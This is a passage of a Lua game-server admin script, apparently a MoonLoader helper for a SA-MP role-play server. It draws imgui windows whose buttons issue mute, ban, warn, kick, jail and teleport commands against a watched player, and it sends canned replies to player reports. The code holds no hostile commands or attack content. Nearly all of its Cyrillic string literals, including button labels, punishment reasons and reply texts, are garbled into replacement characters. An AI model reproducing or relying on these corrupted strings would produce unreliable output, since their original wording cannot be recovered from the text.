			imgui.SetNextWindowPos(imgui.ImVec2(iScreenWidth / 2, iScreenHeight / 2), imgui.Cond.FirstUseEver, imgui.ImVec2(-1.2, 0.5))
			imgui.Begin(u8'Fast CMD(mute)', statew4, imgui.WindowFlags.NoCollapse + imgui.WindowFlags.NoResize)
			if imgui.Button(u8'��������', imgui.ImVec2(-0.1, 38)) then
			if cfg.settings.lvladmin == 1 then
		   sampSendChat('/a /mute '..other.recon_id..' 20 ��������.')
			  else
				sampSendChat('/mute '..other.recon_id..' 20 ��������.')
			end
			end
			if imgui.Button(u8'����������� �������', imgui.ImVec2(-0.1, 38)) then
			if cfg.settings.lvladmin == 1 then
		   sampSendChat('/a /mute '..other.recon_id..' 60 ����������� �������')
		      else
				sampSendChat('/mute '..other.recon_id..' 60 ����������� �������')
			end
			end
			if imgui.Button(u8'���� � ���', imgui.ImVec2(-0.1, 38)) then
			if cfg.settings.lvladmin == 1 then
		   sampSendChat('/a /mute '..other.recon_id..' 20 Flood')
		      else
				sampSendChat('/mute '..other.recon_id..' 20 Flood')
			end
			end
			if imgui.Button(u8'����', imgui.ImVec2(-0.1, 38)) then
			if cfg.settings.lvladmin == 1 then
		   sampSendChat('/a /mute '..other.recon_id..' 20 Caps Lock.')
		      else
				sampSendChat('/mute '..other.recon_id..' 20 Caps Lock.')
			end
			end
			if imgui.Button(u8'���������', imgui.ImVec2(-0.1, 38)) then
			if cfg.settings.lvladmin == 1 then
		   	sampSendChat('/a /mute '..other.recon_id..' 60 ������������ ���������.')
		      else
				sampSendChat('/mute '..other.recon_id..' 60 ������������ ���������.')
			end
			end
			if imgui.Button(u8'������ ���� �� ������', imgui.ImVec2(-0.1, 38)) then
			if cfg.settings.lvladmin == 1 then
		   sampSendChat('/a /mute '..other.recon_id..' 60 ������ ���� �� ��������������.')
		      else
				sampSendChat('/mute '..other.recon_id..' 60 ������ ���� �� ��������������.')
			end
			end
			if imgui.Button(u8'���������� ������', imgui.ImVec2(-0.1, 38)) then
			if cfg.settings.lvladmin == 1 then
		   		sampSendChat('/a /mute '..other.recon_id..' 300 ���������� � ������.')
		      else
				sampSendChat('/mute '..other.recon_id..' 300 ���������� � ������.')
			end
			end
			if imgui.Button(u8'���. �������������', imgui.ImVec2(-0.1, 38)) then
			if cfg.settings.lvladmin == 1 then
		   sampSendChat('/a /mute '..other.recon_id..' 60 ����������� �������������.')
		      else
				sampSendChat('/mute '..other.recon_id..' 60 ����������� �������������.')
			end
			end
			if imgui.Button(u8'��������', imgui.ImVec2(-0.1, 38)) then
			if cfg.settings.lvladmin == 1 then
		   sampSendChat('/a /mute '..other.recon_id..' 60 ��������.')
		      else
				sampSendChat('/mute '..other.recon_id..' 60 ��������.')
			end
			end
			imgui.CenterTextColoredRGB('{FFA500}S U P {ffdead}� {FFA500}2022')
			imgui.End()
		end
		if statew5.v then
			imgui.ShowCursor = true
		
			imgui.SetNextWindowSize(imgui.ImVec2(205, 535), imgui.Cond.FirstUseEver)
			imgui.SetNextWindowPos(imgui.ImVec2(iScreenWidth / 2, iScreenHeight / 2), imgui.Cond.FirstUseEver, imgui.ImVec2(-0.9, 0.5))
			imgui.Begin(u8'Fast CMD(ban)', statew5, imgui.WindowFlags.NoCollapse + imgui.WindowFlags.NoResize)
			if imgui.Button(u8'����', imgui.ImVec2(-0.1, 38)) then
			 if cfg.settings.lvladmin == 1 or cfg.settings.lvladmin == 2 then
			  sampSendChat('/a /ban '..other.recon_id..' 30 ����.')
			   else
				sampSendChat('/ban '..other.recon_id..' 30 ����.')
				
			end
			statew5.v = false
			okno.v = false
		backokno.v = false
				nextokno.v = false
				end
				if imgui.Button(u8'Nick_Name', imgui.ImVec2(-0.1, 38)) then
			 if cfg.settings.lvladmin == 1 or cfg.settings.lvladmin == 2 then
			  sampSendChat('/a /ban '..other.recon_id..' 30 Nick.')
			   else
				sampSendChat('/ban '..other.recon_id..' 30 Nick.')
			end
			statew5.v = false
			okno.v = false
		backokno.v = false
				nextokno.v = false
				end
				if imgui.Button(u8'Fake', imgui.ImVec2(-0.1, 38)) then
			 if cfg.settings.lvladmin == 1 or cfg.settings.lvladmin == 2 then
			  sampSendChat('/a /ban '..other.recon_id..' 30 Fake.')
			   else
				sampSendChat('/ban '..other.recon_id..' 30 Fake.')
			end
			statew5.v = false
			okno.v = false
		backokno.v = false
				nextokno.v = false
				end
			if imgui.Button(u8'����', imgui.ImVec2(-0.1, 38)) then
			 if cfg.settings.lvladmin == 1 or cfg.settings.lvladmin == 2 then
			  	sampSendChat('/a /ban '..other.recon_id..' 30 ����.')
			   else
				sampSendChat('/ban '..other.recon_id..' 30 ����.')
			end
			statew5.v = false
			okno.v = false
		backokno.v = false
				nextokno.v = false
				end
			if imgui.Button(u8'NonRP �����', imgui.ImVec2(-0.1, 38)) then
			 if cfg.settings.lvladmin == 1 or cfg.settings.lvladmin == 2 then
			  sampSendChat('/a /ban '..other.recon_id..' 30 NonRP �����.')
			   else
				sampSendChat('/ban '..other.recon_id..' 30 NonRP �����.')
			end
			statew5.v = false
			okno.v = false
		backokno.v = false
				nextokno.v = false
				end
			if imgui.Button(u8'������/�������/�������', imgui.ImVec2(-0.1, 38)) then
			 if cfg.settings.lvladmin == 1 or cfg.settings.lvladmin == 2 then
			  sampSendChat('/a /ban '..other.recon_id..' 30 �/�/�.')
			   else
				sampSendChat('/ban '..other.recon_id..' 30 �/�/�.')
			end
			statew5.v = false
			okno.v = false
		backokno.v = false
				nextokno.v = false
				end
			if imgui.Button(u8'����� �������������', imgui.ImVec2(-0.1, 38)) then
			 if cfg.settings.lvladmin == 1 or cfg.settings.lvladmin == 2 then
			  sampSendChat('/a /ban '..other.recon_id..' 30 ����� �������������.')
			   else
				sampSendChat('/ban '..other.recon_id..' 30 ����� �������������.')
			end
			statew5.v = false
			okno.v = false
		backokno.v = false
				nextokno.v = false
				end
			if imgui.Button(u8'����������� ������', imgui.ImVec2(-0.1, 38)) then
			 if cfg.settings.lvladmin == 1 or cfg.settings.lvladmin == 2 then
			  sampSendChat('/a /ban '..other.recon_id..' 7 ����������� ������.')
			   else
				sampSendChat('/ban '..other.recon_id..' 7 ����������� ������.')
			end
			statew5.v = false
			okno.v = false
		backokno.v = false
				nextokno.v = false
				end
			if imgui.Button(u8'����������� �������', imgui.ImVec2(-0.1, 38)) then
			 if cfg.settings.lvladmin == 1 or cfg.settings.lvladmin == 2 then
			  sampSendChat('/a /ban '..other.recon_id..' 7 ����������� �������.')
			   else
				sampSendChat('/ban '..other.recon_id..' 7 ����������� �������.')
			end
			statew5.v = false
			okno.v = false
		backokno.v = false
				nextokno.v = false
				end
			if imgui.Button(u8'������', imgui.ImVec2(-0.1, 38)) then
			 if cfg.settings.lvladmin == 1 or cfg.settings.lvladmin == 2 then
			  sampSendChat('/a /ban '..other.recon_id..' 7 ������.')
			   else
				sampSendChat('/ban '..other.recon_id..' 7 ������.')
			end
			statew5.v = false
			okno.v = false
		backokno.v = false
				nextokno.v = false
				end
			if imgui.Button(u8'�������', imgui.ImVec2(-0.1, 38)) then
			 if cfg.settings.lvladmin == 1 or cfg.settings.lvladmin == 2 then
			  sampSendChat('/a /ban '..other.recon_id..' 30 �������.')
			   else
				sampSendChat('/ban '..other.recon_id..' 30 �������.')
			end
			statew5.v = false
			okno.v = false
		backokno.v = false
				nextokno.v = false
				end
			if imgui.Button(u8'�������� /pame /ad /v', imgui.ImVec2(-0.1, 38)) then
			 if cfg.settings.lvladmin == 1 or cfg.settings.lvladmin == 2 then
			  sampSendChat('/a /ban '..other.recon_id..' 3 ��������.')
			   else
				sampSendChat('/ban '..other.recon_id..' 3 ��������.')
			end
			statew5.v = false
			okno.v = false
		backokno.v = false
				nextokno.v = false
				end
			imgui.CenterTextColoredRGB('{FFA500}S U P {ffdead}� {FFA500}2022')
			imgui.End()
		end
		if statew9.v then
			imgui.ShowCursor = true
		
			imgui.SetNextWindowSize(imgui.ImVec2(160, 535), imgui.Cond.FirstUseEver)
			imgui.SetNextWindowPos(imgui.ImVec2(iScreenWidth / 2, iScreenHeight / 2), imgui.Cond.FirstUseEver, imgui.ImVec2(-1.3, 0.5))
			imgui.Begin(u8'��������������', statew9, imgui.WindowFlags.NoCollapse + imgui.WindowFlags.NoResize)
			if imgui.Button(u8'�� � ������', imgui.ImVec2(-0.1, 38)) then
			statew9.v = false
				sampSendChat('/reoff')
				statew9.v = false
				okno.v = false
					backokno.v = false
				nextokno.v = false
			lua_thread.create(function()
			wait(1000)
				sampSendChat('/goto '..other.recon_id..'')
			end)
			end
			if imgui.Button(u8'�� ������ � ����', imgui.ImVec2(-0.1, 38)) then
			if cfg.settings.lvladmin == 1 or cfg.settings.lvladmin == 2 then
				statew9.v = false
				okno.v = false
					backokno.v = false
				nextokno.v = false
				sampSendChat('/reoff')
				lua_thread.create(function()
			wait(1000)
			sampSendChat('/a /ptp '..other.recon_id..' ' ..id)
			end)
				else
			statew9.v = false
			okno.v = false	
			backokno.v = false
				nextokno.v = false
				sampSendChat('/reoff')
				
			lua_thread.create(function()
			wait(1000)
				sampSendChat('/gh '..other.recon_id..'')
			end)
			end
			end
			if imgui.Button(u8'��������� ������', imgui.ImVec2(-0.1, 38)) then
				sampSendChat('/slap '..other.recon_id..'')
			end
			if imgui.Button(u8'�������� ������', imgui.ImVec2(-0.1, 38)) then
				sampSendChat('/flip '..other.recon_id..'')
			end
			if imgui.Button(u8'���������� ������', imgui.ImVec2(-0.1, 38)) then
				sampSendChat('/spawn '..other.recon_id..'')
			end
			if imgui.Button(u8'������ 100 HP', imgui.ImVec2(-0.1, 38)) then
				if cfg.settings.lvladmin == 1 or cfg.settings.lvladmin == 2 then
				sampSendChat('/a /sethp '..other.recon_id..' 100')
				else
				sampSendChat('/sethp '..other.recon_id..' 100')
				end
			end
			if imgui.Button(u8'�������������� ���', imgui.ImVec2(-0.1, 38)) then
			if cfg.settings.lvladmin == 1 then
			sampSendChat('/a /unmute '..other.recon_id..' 0 0')
			else
				sampSendChat('/unmute '..other.recon_id..' 0 0')
				end
			end
			if imgui.Button(u8'��������� �� ���', imgui.ImVec2(-0.1, 38)) then
				unjail_menu.v = true
				statew9.v = false
				okno.v = false
					backokno.v = false
				nextokno.v = false
			end
			if imgui.Button(u8'����������', imgui.ImVec2(-0.1, 38)) then
			if cfg.settings.lvladmin == 1 then
			sampSendChat('/a /freeze '..other.recon_id)
			else
				sampSendChat('/freeze '..other.recon_id)
				end
			end
			if imgui.Button(u8'�����������', imgui.ImVec2(-0.1, 38)) then
				sampSendChat('/unfreeze '..other.recon_id)
			end
			if imgui.Button(u8'������� Nick_Name', imgui.ImVec2(-0.1, 38)) then
				if cfg.settings.lvladmin == 1 or cfg.settings.lvladmin == 2 then
				sampSendChat('/a /setname '..other.recon_id)
				else
				sampSendChat('/setname '..other.recon_id)
				end
				statew9.v = false
			okno.v = false
		backokno.v = false
				nextokno.v = false
			end
			if imgui.Button(u8'��������� ����', imgui.ImVec2(-0.1, 38)) then
setskin.v = true
				statew9.v = false
				okno.v = false
				backokno.v = false
				nextokno.v = false
			end
			imgui.CenterTextColoredRGB('{FFA500}S U P {ffdead}� {FFA500}2022')
			imgui.End()
		end

		if statew6.v then
			imgui.ShowCursor = true
			
			imgui.SetNextWindowSize(imgui.ImVec2(150, 413), imgui.Cond.FirstUseEver)
			imgui.SetNextWindowPos(imgui.ImVec2(iScreenWidth / 2, iScreenHeight / 2), imgui.Cond.FirstUseEver, imgui.ImVec2(-1.5, 0.5))
			imgui.Begin(u8'Fast CMD(warn)', statew6, imgui.WindowFlags.NoCollapse + imgui.WindowFlags.NoResize)
			if imgui.Button(u8'Spawn Kill', imgui.ImVec2(-0.1, 38)) then
			 if cfg.settings.lvladmin == 1 or cfg.settings.lvladmin == 2 then
			 sampSendChat('/a /warn '..other.recon_id..' 7 Spawn Kill')
			 else
				sampSendChat('/warn '..other.recon_id..' 7 Spawn Kill')
			end
			statew6.v = false
			okno.v = false
		backokno.v = false
				nextokno.v = false
			end
			if imgui.Button(u8'OFF �� �������', imgui.ImVec2(-0.1, 38)) then
			 if cfg.settings.lvladmin == 1 or cfg.settings.lvladmin == 2 then
			 sampSendChat('/a /warn '..other.recon_id..' 7 OFF �� �������')
			 else
				sampSendChat('/warn '..other.recon_id..' 7 OFF �� �������')
			end
			statew6.v = false
			okno.v = false
		backokno.v = false
				nextokno.v = false
			end
			if imgui.Button(u8'���� �� ������', imgui.ImVec2(-0.1, 38)) then
			 if cfg.settings.lvladmin == 1 or cfg.settings.lvladmin == 2 then
			 sampSendChat('/a /warn '..other.recon_id..' 7 ���� �� �������')
			 else
				sampSendChat('/warn '..other.recon_id..' 7 ���� �� �������')
			end
			statew6.v = false
			okno.v = false
		backokno.v = false
				nextokno.v = false
			end
			if imgui.Button(u8'OFF �� ������', imgui.ImVec2(-0.1, 38)) then
			 if cfg.settings.lvladmin == 1 or cfg.settings.lvladmin == 2 then
			 sampSendChat('/a /warn '..other.recon_id..' 7 OFF �� ������')
			 else
				sampSendChat('/warn '..other.recon_id..' 7 OFF �� ������')
			end
			statew6.v = false
			okno.v = false
		backokno.v = false
				nextokno.v = false
			end
			if imgui.Button(u8'���� �� ������', imgui.ImVec2(-0.1, 38)) then
			 if cfg.settings.lvladmin == 1 or cfg.settings.lvladmin == 2 then
			 sampSendChat('/a /warn '..other.recon_id..' 7 ���� �� ������')
			 else
				sampSendChat('/warn '..other.recon_id..' 7 ���� �� ������')
			end
			statew6.v = false
			okno.v = false
		backokno.v = false
				nextokno.v = false
			end
			if imgui.Button(u8'+c � ������', imgui.ImVec2(-0.1, 38)) then
			 if cfg.settings.lvladmin == 1 or cfg.settings.lvladmin == 2 then
			 sampSendChat('/a /warn '..other.recon_id..' 7 +c � ������')
			 else
				sampSendChat('/warn '..other.recon_id..' 7 +c � ������')
			end
			statew6.v = false
			okno.v = false
		backokno.v = false
				nextokno.v = false
			end
			if imgui.Button(u8'���� ���� � ���', imgui.ImVec2(-0.1, 38)) then
			 if cfg.settings.lvladmin == 1 or cfg.settings.lvladmin == 2 then
			 sampSendChat('/a /warn '..other.recon_id..' 7 ���� �������� � ���')
			 else
				sampSendChat('/warn '..other.recon_id..' 7 ���� �������� � ���')
			end
			statew6.v = false
			okno.v = false
		backokno.v = false
				nextokno.v = false
			end
			if imgui.Button(u8'���� ��������', imgui.ImVec2(-0.1, 38)) then
			 if cfg.settings.lvladmin == 1 or cfg.settings.lvladmin == 2 then
			 	sampSendChat('/a /warn '..other.recon_id..' 7 ���� ��������')
			 else
				sampSendChat('/warn '..other.recon_id..' 7 ���� ��������')
			end
			statew6.v = false
			okno.v = false
		backokno.v = false
				nextokno.v = false
			end
			if imgui.Button(u8'CLEO Spawn', imgui.ImVec2(-0.1, 38)) then
			 if cfg.settings.lvladmin == 1 or cfg.settings.lvladmin == 2 then
			 sampSendChat('/a /warn '..other.recon_id..' 7 Cleo Spawn.')
			 else
				sampSendChat('/warn '..other.recon_id..' 7 Cleo Spawn.')
			end
			statew6.v = false
			okno.v = false
		backokno.v = false
				nextokno.v = false
			end
			imgui.CenterTextColoredRGB('{FFA500}S U P {ffdead}� {FFA500}2022')
			imgui.End()
		end


		if statew7.v then
			imgui.ShowCursor = true
		
			imgui.SetNextWindowSize(imgui.ImVec2(150, 289), imgui.Cond.FirstUseEver)
			imgui.SetNextWindowPos(imgui.ImVec2(iScreenWidth / 2, iScreenHeight / 2), imgui.Cond.FirstUseEver, imgui.ImVec2(-1.5, 0.5))
			imgui.Begin(u8'Fast CMD(kick)', statew7, imgui.WindowFlags.NoCollapse + imgui.WindowFlags.NoResize)
			if imgui.Button(u8'������', imgui.ImVec2(-0.1, 38)) then
			if cfg.settings.lvladmin == 1 then
			sampSendChat('/a /kick '..other.recon_id..' ������') 
			 else
				sampSendChat('/kick '..other.recon_id..' ������') 
				end
				statew7.v = false
			okno.v = false
		backokno.v = false
				nextokno.v = false
				end
			if imgui.Button(u8'AFK �� ������', imgui.ImVec2(-0.1, 38)) then
			if cfg.settings.lvladmin == 1 then
			sampSendChat('/a /kick '..other.recon_id..' AFK �� ������')
			 else
				sampSendChat('/kick '..other.recon_id..' AFK �� ������')
			end
			statew7.v = false
			okno.v = false
		backokno.v = false
				nextokno.v = false
			end
			if imgui.Button(u8'AFK �����', imgui.ImVec2(-0.1, 38)) then
			if cfg.settings.lvladmin == 1 then
			sampSendChat('/a /kick '..other.recon_id..' AFK �����')
			 else
				sampSendChat('/kick '..other.recon_id..' AFK �����')
			end
			statew7.v = false
			okno.v = false
		backokno.v = false
				nextokno.v = false
			end
			if imgui.Button(u8'AFK ��', imgui.ImVec2(-0.1, 38)) then
			if cfg.settings.lvladmin == 1 then
			sampSendChat('/a /kick '..other.recon_id..' AFK ��')
			 else
				sampSendChat('/kick '..other.recon_id..' AFK ��')
			end
			statew7.v = false
			okno.v = false
		backokno.v = false
				nextokno.v = false
			end
			if imgui.Button(u8'AFK 9/10 15+', imgui.ImVec2(-0.1, 38)) then
			if cfg.settings.lvladmin == 1 then
				afkld.v = true
				statew7.v = false
			--sampSendChat('/a /kick '..other.recon_id..' 7 AFK 9/10 15+')
			 else
			 afkld.v = true
				statew7.v = false
				--sampSendChat('/kick '..other.recon_id..' 7 AFK 9/10 15+')
			end
			end
			if imgui.Button(u8'������ ������', imgui.ImVec2(-0.1, 38)) then
			if cfg.settings.lvladmin == 1 then
			sampSendChat('/a /kick '..other.recon_id..' ������ ������')
			 else
				sampSendChat('/kick '..other.recon_id..' ������ ������')
				end
				statew7.v = false
			okno.v = false
		backokno.v = false
				nextokno.v = false
			end
			imgui.CenterTextColoredRGB('{FFA500}S U P {ffdead}� {FFA500}2022')
			imgui.End()
		end
		
	
    if main_window_state.v then
        imgui.SetNextWindowSize(imgui.ImVec2(485, 665), imgui.Cond.FirstUseEver)
        imgui.SetNextWindowPos(imgui.ImVec2(main_x / 2, main_y / 2), imgui.Cond.FirstUseEver, imgui.ImVec2(0.5, 0.5))
        imgui.Begin(u8"������/������##������", _, imgui.WindowFlags.NoCollapse + imgui.WindowFlags.NoResize + imgui.WindowFlags.NoMove + imgui.WindowFlags.NoBringToFrontOnFocus+ imgui.WindowFlags.NoSavedSettings)
        imgui.TextColoredRGB("������ �� {ffdead}"..nick_report.." {ffffff}[{ffdead}"..id_report.."{ffffff}]")
				if main_window_state.v then 
		okno.v = false
		backokno.v = false
		nextokno.v = false
		statew2.v = false
		statew4.v = false
		statew5.v = false
		statew9.v = false
		statew6.v = false
		statew7.v = false
		statew.v = false
		end
				imgui.SameLine()
				if imgui.Button(u8'�����������', imgui.ImVec2(85, 20)) then
					main_window_state.v = false
					prices_window_state.v = false
					gps_window_state.v = false
					lua_thread.create(function()
						sampSendDialogResponse(id_dialog, 1, nil, "������������, ��������� �����, ������ ��� ��������� | �������� ����")
						wait(100)
						sampCloseCurrentDialogWithButton(0)
						wait(1000)
						 if cfg.settings.lvladmin == 1 then
						 sampSendChat("/unfreeze " ..id_report)
						 else
						sampSendChat("/unfreeze " ..id_report )
						end
					end)
				end
				imgui.SameLine()
			if imgui.Button(u8'����������', imgui.ImVec2(85, 20)) then
					main_window_state.v = false
					prices_window_state.v = false
					gps_window_state.v = false
					lua_thread.create(function()
						sampSendDialogResponse(id_dialog, 1, nil, "������������, ��������� �����, �������� | �������� ����")
						wait(100)
						sampCloseCurrentDialogWithButton(0)
						wait(1000)
						sampSendChat("/spawn " ..id_report )
					end)
				end
				imgui.SameLine()
			if imgui.Button(u8'Nick', imgui.ImVec2(85, 20)) then
			main_window_state.v = false
					prices_window_state.v = false
					gps_window_state.v = false
					lua_thread.create(function()
						sampSendDialogResponse(id_dialog, 1, nil, "������������, ��������� �����, ������ ����� | �������� ����")
						wait(100)
						sampCloseCurrentDialogWithButton(0)
						wait(1000)
						if cfg.settings.lvladmin == 1 or cfg.settings.lvladmin == 2 then
						sampSendChat("/a /setname " ..id_report)
						else 
						sampSendChat("/setname " ..id_report )
						end
					end)
				
			end
        imgui.PushItemWidth(485)
         imgui.TextWrapped(u8''..u8(text_report))
		
        imgui.Separator()

				imgui.NewInputText(u8'##Answer_report', text_buffer, 470, u8"������� ��������� ��� ������ �� ������ ������", 2)

        imgui.Separator()
		imgui.CenterTextColoredRGB('������� ������:', main_window_state)
        if imgui.Button(u8'����� �� �����������', imgui.ImVec2(150, 22)) then
        	main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
			
        	lua_thread.create(function()
        		sampSendDialogResponse(id_dialog, 1, nil, "��������� �����, ��� � ������ �� �����������.")
        		sampCloseCurrentDialogWithButton(0)
        		wait(1000)
        		if recon_suspect then
				other.recon_id = id_suspect tonumber(arg)
        			sampSendChat("/re "..id_suspect, other.recon_id)
        			sampAddChatMessage(tag.."{FFFFFF} �� ���� � ������ �� �����������.", 0xFFFFFF)
        		else
        			sampAddChatMessage(tag.."{FFFFFF} � ������� �� ��� ������ ID ����������.", 0xFFFFFF)
        			sampAddChatMessage(tag.."{FFFFFF} ���������� �������: "..text_report, 0xFFFFFF)
	      		end
        	end)
        end
        imgui.SameLine()
        if imgui.Button(u8'������ ������ (/re)', imgui.ImVec2(150, 22)) then
        	main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
			
        	lua_thread.create(function()
			other.recon_id = id_report tonumber(arg)
        		sampSendDialogResponse(id_dialog, 1, nil, "��������� �����, ������ �������� ��� ������.")
        		wait(100)
        		sampCloseCurrentDialogWithButton(0)
        		wait(1000)
	        	sampSendChat("/re "..id_report, other.recon_id)
				
				
	        	sampAddChatMessage(tag.."{FFFFFF} �� ���� � ������ �� ������� �������.", 0xFFFFFF)
        	end)
        end
        imgui.SameLine()
        if imgui.Button(u8'������ ������ (/g)', imgui.ImVec2(150, 22)) then
        	main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
        	lua_thread.create(function()
        		sampSendDialogResponse(id_dialog, 1, nil, "��������� �����, ������ �������� ��� ������.")
        		wait(100)
        		sampCloseCurrentDialogWithButton(0)
        		wait(1000)
	        	sampSendChat("/goto "..nick_report)
	        	sampAddChatMessage(tag.."{FFFFFF} �� ����������������� � ������ �������.", 0xFFFFFF)
	        end)
        end
        if imgui.Button(u8'���. ���� �/�', imgui.ImVec2(150, 22)) then
            prices_imgui()
        end
        imgui.SameLine()
        if imgui.Button(u8'��������� � /a ���', imgui.ImVec2(150, 22)) then
            main_window_state.v = false
            prices_window_state.v = false
            gps_window_state.v = false
            lua_thread.create(function()
                sampSendDialogResponse(id_dialog, 1, nil, "��������� �����, ������� ������ ������������� Flin RP! ")
                wait(100)
                sampCloseCurrentDialogWithButton(0)
                wait(1000)
				sampSendChat("/a [REP]" ..nick_report.. " [" ..id_report.. "] | " ..text_report )
            end)

        end
        imgui.SameLine()
        if imgui.Button(u8'GPS', imgui.ImVec2(150, 22)) then
            gps_imgui()
        end

				if imgui.Button(u8'Offtop', imgui.ImVec2(150, 22)) then
        	main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
        	lua_thread.create(function()
        		sampSendDialogResponse(id_dialog, 1, nil, "��������� �����, ���������� �� ���������.")
        		wait(100)
        		sampCloseCurrentDialogWithButton(0)
	        end)
        end
				imgui.SameLine()
				if imgui.Button(u8'�� �������', imgui.ImVec2(150, 22)) then
        	main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
        	lua_thread.create(function()
        		sampSendDialogResponse(id_dialog, 1, nil, "������������ ��������� �����, �� �������")
        		wait(100)
        		sampCloseCurrentDialogWithButton(0)
	        end)
        end
				imgui.SameLine()
        if imgui.Button(u8'�� �����', imgui.ImVec2(150, 22)) then
        	main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
        	lua_thread.create(function()
        		sampSendDialogResponse(id_dialog, 1, nil, "������������ ��������� �����, �� �����")
        		wait(100)
        		sampCloseCurrentDialogWithButton(0)
	        end)
        end
				if imgui.Button(u8'�������� ����', imgui.ImVec2(150, 22)) then
        	main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
        	lua_thread.create(function()
        		sampSendDialogResponse(id_dialog, 1, nil, "�������� ���� �� Flin Role Play)")
        		wait(100)
        		sampCloseCurrentDialogWithButton(0)
	        end)
				end
				imgui.SameLine()
				if imgui.Button(u8'�����', imgui.ImVec2(150, 22)) then
        	main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
        	lua_thread.create(function()
        		sampSendDialogResponse(id_dialog, 1, nil, "�������� ������ �� ����� ������  ' forum.flin-rp.com ' ")
        		wait(100)
        		sampCloseCurrentDialogWithButton(0)
	        end)
				end
				imgui.SameLine()
				if imgui.Button(u8'�������� � ���� (/gh)', imgui.ImVec2(150, 22)) then
        		main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
        	lua_thread.create(function()
        		sampSendDialogResponse(id_dialog, 1, nil, "��������� �����, ������ �������� ��� ������, ������������ ��� � ����.")
        		wait(100)
        		sampCloseCurrentDialogWithButton(0)
        		wait(1000)
				 if cfg.settings.lvladmin == 1 or cfg.settings.lvladmin == 2 then
				 sampSendChat("/a /ptp "..id_report.." "..id)
				 wait(1000)
				 sampAddChatMessage(tag.."{FFFFFF} �� ��������� ����� �� �� ������ ������� � ���.", 0xFFFFFF)
				 else
	        	sampSendChat("/gethere "..nick_report)
	        	sampAddChatMessage(tag.."{FFFFFF} �� ��������������� ������ ������� � ����.", 0xFFFFFF)
				end
	        end)
				end
				if imgui.Button(u8'�������������� ���', imgui.ImVec2(150, 22)) then
				main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
        	lua_thread.create(function()
        		sampSendDialogResponse(id_dialog, 1, nil, "��������� �����, ������ ����� ��� ���������� ����.")
        		wait(100)
        		sampCloseCurrentDialogWithButton(0)
        		wait(1000)
				if cfg.settings.lvladmin == 1 then
				sampSendChat("/a /unmute "..id_report)
					wait(500)
				sampAddChatMessage(tag.."{FFFFFF} �� ��������� ����� �� ������ ���������� ���� ������ �������.", 0xFFFFFF)
				else
	        	sampSendChat("/unmute "..nick_report)
					wait(500)
	        	sampAddChatMessage(tag.."{FFFFFF} �� ����� ���������� ���� ������ �������.", 0xFFFFFF)
				end
	        end)
				end
			imgui.SameLine()
			if imgui.Button(u8'������ 100 HP', imgui.ImVec2(150, 22)) then
				main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
        	lua_thread.create(function()
        		sampSendDialogResponse(id_dialog, 1, nil, "��������� �����, ������ ����� ��� 100 HP.")
        		wait(100)
        		sampCloseCurrentDialogWithButton(0)
        		wait(1000)
				if cfg.settings.lvladmin == 1 or cfg.settings.lvladmin == 2 then
				sampSendChat("/a /sethp "..id_report .." 100")
				wait(500)
				sampAddChatMessage(tag.."{FFFFFF} �� ��������� ����� �� ������ ������ ������� 100 HP.", 0xFFFFFF)
				else
	        	sampSendChat("/sethp "..nick_report .." 100")
					wait(500)
	        	sampAddChatMessage(tag.."{FFFFFF} �� ������ ������ ������� 100 HP.", 0xFFFFFF)
				end
	        end)
				end
				imgui.SameLine()
				if imgui.Button(u8'��������� �� ���', imgui.ImVec2(150, 22)) then
				main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
        	lua_thread.create(function()
        		sampSendDialogResponse(id_dialog, 1, nil, "��������� �����, ������ ������ ��� �� ���������.")
        		wait(100)
        		sampCloseCurrentDialogWithButton(0)
        		wait(1000)
				if cfg.settings.lvladmin == 1 then
				sampSendChat("/a /jail "..id_report .." 0 0")
				wait(500)
				sampAddChatMessage(tag.."{FFFFFF} �� ��������� ����� �� ������ ������ ������� �� ���������.", 0xFFFFFF)
				else
	        	sampSendChat("/jail "..nick_report .." 0 0")
				wait(500)
	        	sampAddChatMessage(tag.."{FFFFFF} �� ��������� ������ ������� �� ���������.", 0xFFFFFF)
				end
	        end)
				end
			--
			
				if imgui.Button(u8'�� �������������', imgui.ImVec2(150, 22)) then
				main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
        	lua_thread.create(function()
        		sampSendDialogResponse(id_dialog, 1, nil, "��������� �����, �� �������������, �������� �����.")
        		wait(100)
        		sampCloseCurrentDialogWithButton(0)
        		wait(500)
	        	--sampSendChat("/jail "..nick_report .." 0 0")
	        	sampAddChatMessage(tag.."{FFFFFF} �� �������� ������ �������, ��� �� ��������������.", 0xFFFFFF)
	        end)
				end
				imgui.SameLine()
				if imgui.Button(u8'��������� ���', imgui.ImVec2(150, 22)) then
				main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
        	lua_thread.create(function()
        		sampSendDialogResponse(id_dialog, 1, nil, "��������� �����, ������ �������� ���.")
        		wait(100)
        		sampCloseCurrentDialogWithButton(0)
        		wait(500)
				  
				if cfg.settings.lvladmin == 1 then
			
				sampSendChat("/a /ooc ���! �������� ������������� ����������! ������ ��������!")
				wait(800)
				sampAddChatMessage(tag.."{FFFFFF} �� ��������� ����� �� ooc � �������� ������ ������ ���.", 0xFFFFFF)
				else
	        	sampSendChat("/ooc ���! �������� ������������� ����������! ������ ��������!")
				wait(800)
	        sampAddChatMessage(tag.."{FFFFFF} �� �������� � OOC � �������� � ������ ���.", 0xFFFFFF)
			
				end
				end)
				
				end
				imgui.SameLine()
				if imgui.Button(u8'�� �����', imgui.ImVec2(150, 22)) then
				main_window_state.v = false
        	prices_window_state.v = false
        	gps_window_state.v = false
        	lua_thread.create(function()
        		sampSendDialogResponse(id_dialog, 1, nil, "��������� �����, �� �����, ����������� �������.")
        		wait(100)
        		sampCloseCurrentDialogWithButton(0)
        		wait(500)
	        	--sampSendChat("/jail "..nick_report .." 0 0")
